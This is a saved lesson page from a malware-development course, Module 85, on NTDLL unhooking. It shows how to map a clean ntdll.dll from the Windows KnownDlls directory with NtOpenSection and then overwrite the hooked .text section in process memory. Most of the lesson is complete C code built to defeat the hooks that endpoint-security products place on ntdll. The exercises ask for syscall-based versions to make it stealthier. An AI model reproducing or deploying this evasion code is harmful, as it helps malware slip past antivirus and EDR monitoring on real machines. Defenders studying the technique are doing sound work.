<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/css2_002.css" rel="stylesheet">
        <link href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/css2.css" rel="stylesheet">
        <title>NTDLL Unhooking - From KnownDlls Directory</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 85 - NTDLL Unhooking - From KnownDlls Directory
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/KnownDllUnhooking" target="_blank">
                    <img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>NTDLL Unhooking - From KnownDlls Directory</h2>
<h3>Introduction</h3>
<p>Another way to obtain a clean version of <code>ntdll.dll</code> is by
 accessing it from the KnownDlls directory. This directory contains a 
set of frequently used system DLLs that the Windows loader leverages to 
optimize the application startup process. The loader maps the DLLs from 
KnownDlls directly into the starting processes, which are already 
present in memory. This approach saves memory and reduces computational 
resources by eliminating the need for mapping each required DLL from the
 disk.</p>
<p>In Windows XP and older, the KnownDlls directory was located in the <code>C:\Windows\System32</code>
 folder. Newer versions of Windows have the directory built into the OS 
and therefore the directory is not directly accessible. A list of known 
DLLs can be found in the <em>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</em> registry key as per <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" target="_blank">Microsoft's documentation</a>.</p>
<h3>Viewing KnownDlls Using WinObj</h3>
<p>The <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/winobj" target="_blank">WinObj</a> tool can be used to view the contents of the KnownDlls directory. This is demonstrated in the image below.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ntdll-unhooking-knowndlls-118473010-cd9df141-2f08-47f7-a57e-.png" alt="image"></p>
<h3>Retrieving Ntdll.dll From KnownDlls</h3>
<p>DLLs stored in the KnownDlls directory can be retrieved and mapped to
 the local process memory using a handle. This is achieved 
programmatically through the use of two WinAPI functions: <code>OpenFileMapping</code> to obtain the section handle of <code>ntdll.dll</code>, and <code>MapViewOfFile</code> to map <code>ntdll.dll</code> to memory.</p>
<p>Using the <code>OpenFileMapping</code> WinAPI will always fail with the error <code>ERROR_BAD_PATHNAME</code>. As of writing this module, the reason is still unknown. However, an alternative method is to simply use its native function, <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtOpenSection.html" target="_blank">NtOpenSection</a>.</p>
<p>This is a good example of using syscalls instead of WinAPIs to perform tasks that are unavailable with WinAPIs.</p>
<h4>Using NtOpenSection</h4>
<p>The <code>NtOpenSection</code> function is shown below.</p>
<pre><code>NTSTATUS NtOpenSection(
  OUT PHANDLE             SectionHandle,
  IN  ACCESS_MASK         DesiredAccess,
  IN  POBJECT_ATTRIBUTES  ObjectAttributes
);
</code></pre>
<p><code>NtOpenSection</code>'s parameters are explained below.</p>
<ul>
<li>
<p><code>SectionHandle</code> - A pointer to a <code>HANDLE</code> variable that receives a handle to the section object.</p>
</li>
<li>
<p><code>DesiredAccess</code> - A value that determines the requested access to the object. This value is of type <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/access-mask" target="_blank">ACCESS_MASK</a>. For NTDLL unhooking, this parameter should be set to <code>SECTION_MAP_READ</code> since <code>\KnownDlls\ntdll.dll</code> image will only be read.</p>
</li>
<li>
<p><code>ObjectAttributes</code> - A pointer to an <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes" target="_blank">OBJECT_ATTRIBUTES</a> structure that specifies the object name and other attributes. This parameter is initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" target="_blank">InitializeObjectAttributes</a> macro.</p>
</li>
</ul>
<h3>InitializeObjectAttributes</h3>
<p>As mentioned above, <code>ObjectAttributes</code> must be initialized using <code>InitializeObjectAttributes</code> in order to use <code>NtOpenSection</code>.</p>
<pre><code>VOID InitializeObjectAttributes(
  [out]          POBJECT_ATTRIBUTES   p,
  [in]           PUNICODE_STRING      n,
  [in]           ULONG                a,
  [in]           HANDLE               r,  // Set to NULL
  [in, optional] PSECURITY_DESCRIPTOR s   // Set to NULL
);
</code></pre>
<p><code>InitializeObjectAttributes</code>'s parameters are also shown below.</p>
<ul>
<li>
<p><code>p</code> - A pointer to an empty <code>OBJECT_ATTRIBUTES</code> structure that will be initialized.</p>
</li>
<li>
<p><code>n</code> - A pointer to a <code>UNICODE_STRING</code> structure that contains the name of the object for which a handle is to be opened.</p>
</li>
<li>
<p><code>a</code> - Should be set to <code>OBJ_CASE_INSENSITIVE</code> to perform a case-insensitive comparison for the name of the object for which a handle is to be opened.</p>
</li>
</ul>
<p>To properly use the <code>n</code> parameter, which is a <code>UNICODE_STRING</code> structure, the <code>buffer</code> member must be initialized as "\KnownDlls\ntdll.dll" (wide string format). The <code>length</code> member should be the size of the buffer in bytes. This initialization can be achieved using the code snippet below:</p>
<pre><code>UNICODE_STRING.Buffer = (PWSTR)L"\KnownDlls\ntdll.dll";                       
UNICODE_STRING.Length = wcslen(L"\KnownDlls\ntdll.dll") * sizeof(WCHAR);    // calculating the size of the string used in bytes
UNICODE_STRING.MaximumLength = UniStr.Length + sizeof(WCHAR);               // '.MaximumLength' can be the same as '.Length'
</code></pre>
<h4>MapNtdllFromKnownDlls Function</h4>
<p>The <code>MapNtdllFromKnownDlls</code> function is used to retrieve <code>ntdll.dll</code> from the KnownDlls directory. It accepts a single parameter, <code>ppNtdllBuf</code>, which will be set to the base address of the mapped view of the <code>ntdll.dll</code> file.</p>
<p><code>MapNtdllFromKnownDlls</code> handles the parameters required for <code>NtOpenSection</code> before passing its output to <code>MapViewOfFile</code>, which is used to map <code>ntdll.dll</code> to local memory. The function returns a value of <code>FALSE</code> if it fails and <code>TRUE</code> if it succeeds.</p>
<pre><code>
#define NTDLL	L"\\KnownDlls\\ntdll.dll"

typedef NTSTATUS (NTAPI* fnNtOpenSection)(
	PHANDLE               SectionHandle,
	ACCESS_MASK           DesiredAccess,
	POBJECT_ATTRIBUTES    ObjectAttributes
);


BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {

	HANDLE    		    hSection        = NULL;
	PBYTE     		    pNtdllBuffer    = NULL;
	NTSTATUS            	STATUS          = NULL;
	UNICODE_STRING      	UniStr          = { 0 };
	OBJECT_ATTRIBUTES  	ObjAtr          = { 0 };

	// constructing the 'UNICODE_STRING' that will contain the '\KnownDlls\ntdll.dll' string
	UniStr.Buffer = (PWSTR)NTDLL;
	UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
	UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

	// initializing 'ObjAtr' with 'UniStr'
	InitializeObjectAttributes(&amp;ObjAtr, &amp;UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// getting NtOpenSection address
	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtOpenSection");
	
	// getting the handle of ntdll.dll from KnownDlls
	STATUS = pNtOpenSection(&amp;hSection, SECTION_MAP_READ, &amp;ObjAtr);
	if (STATUS != 0x00) {
		printf("[!] NtOpenSection Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// mapping the view of file of ntdll.dll
	pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h3>Putting It All Together</h3>
<p>Now that an unhooked version of <code>ntdll.dll</code> has been loaded into the process's memory, the <code>ReplaceNtdllTxtSection</code> function shown in the previous module will be used to replace the text section of the hooked <code>ntdll.dll</code> with the newly unhooked one. The only difference is that the <code>pUnhookedNtdll</code> parameter now contains the base address of the NTDLL module fetched from the KnownDlls directory, rather than from disk.</p>
<p>Note that the text section of the KnownDlls <code>ntdll.dll</code> has an offset of <code>IMAGE_SECTION_HEADER.VirtualAddress</code> (4096), which explains the usage of <code>pSectionHeader[i].VirtualAddress</code> to retrieve the address of the text section (<code>pRemoteNtdllTxt</code>) in the code below.</p>
<pre><code>PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'KnownDllUnhooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	return pLdr-&gt;DllBase;
}


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll     = (PVOID)FetchLocalNtdllBaseAddress();

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr    = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs     = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------
	
	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------
	
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Improving The Implementation</h3>
<p>The current implementation unhooks <code>ntdll.dll</code> using 
WinAPIs. For a stealthier implementation, direct or indirect syscalls 
should be used to perform unhooking. This will be left as an objective 
for the reader.</p>
<h3>Demo</h3>
<p>The mapped ntdll.dll file from the KnownDlls directory.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ntdll-unhooking-knowndlls-218529831-d561ae0a-5e2b-4da9-9eb6-.png" alt="h1">
<br></p>
<p>The hooked ntdll.dll text section to be replaced.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ntdll-unhooking-knowndlls-318529838-7c90c7e7-efd9-4dcb-965f-.png" alt="h2">
<br></p>
<p>The text section base address of the unhooked ntdll.dll.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ntdll-unhooking-knowndlls-418529851-010d8412-8dce-4855-bfb8-.png" alt="h3">
<br></p>
<p>Replacing the text section.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/ntdll-unhooking-knowndlls-518529888-b486838f-b284-46e5-83d4-.png" alt="h4"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Download and run WinObj to view the contents of the KnownDlls directory</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement the 'MapNtdllFromKnownDlls' function using direct syscalls</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement the 'ReplaceNtdllTxtSection' function using direct syscalls</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/84"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/85/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/85/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/86"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/jquery-3.6.0.min.js"></script>
        <script src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.4474f4d1.css"><link rel="modulepreload" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.5f3af5ce.js"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.4474f4d1.css"><script type="module" src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/app.5f3af5ce.js"></script><script src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/navbar.js"></script>
<script src="NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 85;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>